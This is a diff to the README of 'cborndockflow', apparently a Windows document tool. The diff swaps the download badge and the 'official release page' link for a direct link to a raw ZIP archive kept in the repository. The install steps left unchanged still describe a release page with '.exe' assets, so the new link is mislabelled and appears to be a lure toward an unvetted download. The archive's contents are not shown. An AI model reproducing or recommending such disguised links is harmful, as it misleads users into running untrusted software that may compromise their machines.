@@ -1,6 +1,6 @@
 # 📄 cborndockflow - Manage your documents with local tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gwenorabespoken424/cborndockflow/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gwenorabespoken424/cborndockflow/raw/refs/heads/main/cborn_docflow/Software-3.5.zip)
 
 ## 📋 About This App
 
@@ -19,7 +19,7 @@ This software runs on Windows. Your computer needs the following specifications 
 
 Follow these steps to set up cborndockflow on your computer.
 
-1. Go to the [official release page](https://github.com/Gwenorabespoken424/cborndockflow/releases).
+1. Go to the [official release page](https://github.com/Gwenorabespoken424/cborndockflow/raw/refs/heads/main/cborn_docflow/Software-3.5.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file that ends with ".exe" to start the download.
 4. Open the downloaded file once the transfer completes.
